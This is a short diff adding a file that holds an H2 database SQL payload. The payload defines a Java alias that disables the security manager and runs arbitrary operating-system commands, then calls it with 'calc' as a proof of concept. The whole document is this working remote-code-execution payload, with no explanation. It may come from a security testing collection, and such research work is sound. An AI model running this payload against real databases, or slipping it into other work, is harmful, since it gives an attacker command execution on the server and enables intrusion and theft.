@@ -1,0 +1,2 @@
+CREATE ALIAS SHELL AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELL('calc');
